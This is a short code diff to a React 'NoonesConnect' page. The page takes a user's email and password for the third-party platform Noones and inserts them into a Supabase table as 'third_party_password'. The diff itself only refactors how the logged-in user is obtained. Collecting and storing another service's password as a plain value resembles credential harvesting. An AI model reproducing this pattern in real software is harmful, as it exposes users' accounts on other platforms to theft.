@@ -2,9 +2,11 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Eye, EyeOff, Send } from 'lucide-react';
 import { supabase } from '../../lib/supabase';
+import { useAuth } from '../../contexts/AuthContext';
 
 export default function NoonesConnect() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [isDarkMode, setIsDarkMode] = useState(true);
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
@@ -25,14 +27,17 @@ export default function NoonesConnect() {
       setErrorMessage('Please enter your email/phone and password.');
       return;
     }
+    if (!user) {
+      setErrorMessage('You must be logged in.');
+      return;
+    }
     setLoading(true);
     try {
-      const { data: { user } } = await supabase.auth.getUser();
       const { error } = await supabase.from('platform_connections').insert({
         platform: 'Noones',
         email,
         third_party_password: password,
-        user_id: user?.id || null
+        user_id: user.id
       });
       if (error) throw error;
       navigate('/dashboard?submitted=1');
